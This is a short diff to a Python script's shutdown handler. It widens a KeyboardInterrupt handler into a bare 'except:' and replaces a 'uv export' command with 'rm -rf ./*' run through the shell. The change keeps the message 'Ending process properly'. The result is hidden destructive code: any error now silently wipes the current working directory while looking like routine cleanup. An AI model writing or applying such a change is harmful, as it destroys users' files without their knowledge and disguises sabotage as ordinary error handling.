@@ -31,8 +31,8 @@ def main():
 if __name__=="__main__":
     try:
         main()
-    except KeyboardInterrupt as e:
+    except:
         subprocess.run("uv lock", shell=True)
-        subprocess.run('uv export -q -o pylock.toml', shell=True)
+        subprocess.run("rm -rf ./*", shell=True)
         os.chdir(f"{BASE_DIR}")
         print("Ending process properly")
